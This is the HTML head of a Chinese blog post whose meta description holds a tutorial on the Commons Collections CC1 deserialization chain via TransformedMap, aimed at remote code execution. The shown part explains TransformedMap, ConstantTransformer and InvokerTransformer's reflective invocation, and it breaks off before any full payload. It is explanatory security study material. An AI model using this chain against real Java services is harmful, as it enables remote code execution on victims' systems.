<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
    
	<title>Java安全-CC1链TransformedMap分析 - Mask安全小组&#39;s Blog</title>
    <meta name="author" content="">
    
	<meta name="description" content="&lt;p&gt;本文将详细分析讲解CommonsCollections组件的反序列化漏洞结合使用TransformedMap进行触发RCE。&lt;/p&gt;
&lt;p&gt;在开始前，你需要具备掌握JavaSE的基础、Java反射的知识点，以及需要Jdk版本环境小于8u71。&lt;/p&gt;
&lt;p&gt;旧版Jdk下载地址: &lt;a href=&#34;https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html&#34;&gt;https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;Demo&#34;&gt;&lt;a href=&#34;#Demo&#34; class=&#34;headerlink&#34; title=&#34;Demo&#34;&gt;&lt;/a&gt;Demo&lt;/h1&gt;&lt;p&gt;先在IDEA上创建一个Maven项目，并引入存在漏洞的commons-collections组件，创建好相应的main函数。方便后续分析&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;commons-collections&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;commons-collections&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;3.2.1&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;一些类和接口介绍&#34;&gt;&lt;a href=&#34;#一些类和接口介绍&#34; class=&#34;headerlink&#34; title=&#34;一些类和接口介绍&#34;&gt;&lt;/a&gt;一些类和接口介绍&lt;/h1&gt;&lt;p&gt;在正式开始分析CC1-TransformedMap Payload之前，需要先讲解一下几个类和接口的作用。&lt;/p&gt;
&lt;h2 id=&#34;TransformedMap&#34;&gt;&lt;a href=&#34;#TransformedMap&#34; class=&#34;headerlink&#34; title=&#34;TransformedMap&#34;&gt;&lt;/a&gt;TransformedMap&lt;/h2&gt;&lt;p&gt;先介绍一下TransformedMap这个类，个人理解这个类主要是对Map的一个包装，包装后的Map能实现在调用put函数时，对key和value进一步的进行处理(或者也可以叫转换)，原生的Map是没有这个功能的，所以通过包装之后就能实现这个效果。&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 包装之前，需要一个原生的Map。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;map&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;HashMap&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 获得一个包装后的map&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;transformedMap&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;  TransformedMap.decorate(map, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;k -&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Transformed-&amp;quot;&lt;/span&gt; + k;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;v -&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Transformed-&amp;quot;&lt;/span&gt; + v;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 对包装的map调用put函数时将触发上边2个回调函数。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;transformedMap.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;key&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;val&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// &amp;#123;Transformed-key=Transformed-val&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;System.out.println(transformedMap);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;我们向transformedMap里put一对键值&lt;code&gt;key=val&lt;/code&gt;，打印的结果为&lt;code&gt;Transformed-key=Transformed-val&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里我们存入的是&lt;code&gt;key=val&lt;/code&gt;，但因为是包装的map所以在调用put之后触发了回调函数，也就是decorate传入的第二个参数和第三个参数，在回调函数中我在原先的k和v上加了&lt;code&gt;Transformed-&lt;/code&gt;，所以最终打印的结果为&lt;code&gt;Transformed-key=Transformed-val&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112236399.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;p&gt;除了上边说到的put会触发之外呢，还有另外一种情况也会触发回调函数。&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;map&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;HashMap&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;map.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;value&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;123&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;TransformedMap&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;transformedMap&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (TransformedMap) TransformedMap.decorate(map,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;k -&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Transformed-&amp;quot;&lt;/span&gt; + k;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;, v -&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Transformed-&amp;quot;&lt;/span&gt; + v;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 获取一个用户map遍历的迭代器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Iterator&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;iterator&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; transformedMap.entrySet().iterator();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 使用迭代器进行遍历&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (iterator.hasNext()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Map.&lt;span class=&#34;type&#34;&gt;Entry&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;entry&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (Map.Entry) iterator.next();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 设置value为123，这里在调用时会触发回调函数。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    entry.setValue(&lt;span class=&#34;string&#34;&gt;&amp;quot;123&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// &amp;#123;value=Transformed-123&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;System.out.println(transformedMap);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;运行后的结果是&lt;code&gt;&amp;#123;value=Transformed-123&amp;#125;&lt;/code&gt;，就是也触发了回调函数，但是只修改了键值对中的值，也就是键值对的键没有修改，所以获取迭代器后进行&lt;code&gt;setValue&lt;/code&gt;时会触发&lt;code&gt;decorate&lt;/code&gt;的第三个参数位置的回调函数。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112303112.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;Transformer&#34;&gt;&lt;a href=&#34;#Transformer&#34; class=&#34;headerlink&#34; title=&#34;Transformer&#34;&gt;&lt;/a&gt;Transformer&lt;/h2&gt;&lt;p&gt;Transformer是一个接口，上边TransformedMap.decorate第二个参数和第三个参数需要接收的类型就是这个接口类型。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112311866.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;p&gt;我在介绍TransformedMap时用的是Java8的lambda来简化传参数的写法&lt;/p&gt;
&lt;p&gt;java8写法: &lt;code&gt;k -&amp;gt; &amp;#123;...&amp;#125;, v -&amp;gt; &amp;#123;...&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Transformer这个接口只有一个函数需要实现，函数名为&lt;code&gt;transform()&lt;/code&gt;，它有一个参数input，这个input其实就是put时对应的&lt;code&gt;key111&lt;/code&gt;和&lt;code&gt;val111&lt;/code&gt;，第一个Transformr对应的是map的键的处理，第二个对应的是值的处理。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112337591.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以Transformer的&lt;code&gt;transform()&lt;/code&gt;函数实际上就是你要对键或值的处理逻辑。&lt;/p&gt;
&lt;h2 id=&#34;ConstantTransformer&#34;&gt;&lt;a href=&#34;#ConstantTransformer&#34; class=&#34;headerlink&#34; title=&#34;ConstantTransformer&#34;&gt;&lt;/a&gt;ConstantTransformer&lt;/h2&gt;&lt;p&gt;ConstantTransformer是Transformer的一个实现类，这个是CommonsCollections组件内已经实现好的一个类。&lt;/p&gt;
&lt;p&gt;我们主要来看看它的transform函数的实现逻辑: &lt;code&gt;org.apache.commons.collections.functors.ConstantTransformer#transform&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;它的逻辑很简单，就直接返回iConstant这个成员属性。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112348008.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个iConstant是什么呢？我们来看看ConstantTransformer的构造函数，构造函数接收一个constantToReturn然后就直接赋值给iConstant。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112356667.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么这个类其实它的作用就是，在构造函数上传什么给它，对应的transform函数就返回什么。那么这里就起来很诡异，这有什么用？其实这个不用太多去纠结，可能在某些业务场景会用到吧！&lt;/p&gt;
&lt;p&gt;我们来写一段代码，这里我们定义了2个ConstantTransformer然后分别在构造函数上传递参数&lt;code&gt;123&lt;/code&gt;和&lt;code&gt;456&lt;/code&gt;。在向&lt;code&gt;transformedMap&lt;/code&gt;里&lt;code&gt;put&lt;/code&gt;key111&lt;code&gt;和&lt;/code&gt;val111&amp;#96;&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;map&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;HashMap&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;transformedMap&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; TransformedMap.decorate(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        map,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ConstantTransformer&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;123&amp;quot;&lt;/span&gt;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ConstantTransformer&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;456&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;transformedMap.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;key111&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;val111&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// &amp;#123;123=456&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;System.out.println(transformedMap);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;打印的结果为&lt;code&gt;123=456&lt;/code&gt;，前边已经说过&lt;code&gt;ConstantTransformer&lt;/code&gt;就是你在构造函数上传什么，它的处理函数&lt;code&gt;transform()&lt;/code&gt;就返回什么，所以在我们&lt;code&gt;put&lt;/code&gt;后触发回调函数&lt;code&gt;ConstantTransformer#transform&lt;/code&gt;，处理后的结果就是&lt;code&gt;123=456&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&#34;InvokerTransformer&#34;&gt;&lt;a href=&#34;#InvokerTransformer&#34; class=&#34;headerlink&#34; title=&#34;InvokerTransformer&#34;&gt;&lt;/a&gt;InvokerTransformer&lt;/h2&gt;&lt;p&gt;InvokerTransformer也是Transformer接口的一个实现类，它也是CommonCollections组件内已经实现好的一个类。&lt;/p&gt;
&lt;p&gt;通过这个InvokerTransformer我们可以来实现函数的调用，先看一下InvokerTransformer的&lt;code&gt;transform()&lt;/code&gt;函数。&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; Object &lt;span class=&#34;title function_&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Object input)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// 检验是否为空&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (input == &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 获取input这个实例的 类类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;cls&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; input.getClass();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 根据iMethodName来获取input这个类里的函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;method&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; cls.getMethod(iMethodName, iParamTypes);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 通过反射调用这个函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; method.invoke(input, iArgs);   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;// 异常捕获，我删减了！&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;InvokerTransformer的&lt;code&gt;transform()&lt;/code&gt;会根据&lt;code&gt;iMethodName&lt;/code&gt;来调用input这个实例对应类里的函数，那么我们继续看一下这个&lt;code&gt;iMethodName&lt;/code&gt;是哪来的。&lt;/p&gt;
&lt;p&gt;在InvokerTransformer的构造函数里就有接收这个参数，并赋值给成员属性&lt;code&gt;iMethodName&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112434683.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么我们来自定义一个类，然后通过InvokerTransformer来调用自定义类里的函数。&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Test&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String msg)&lt;/span&gt; 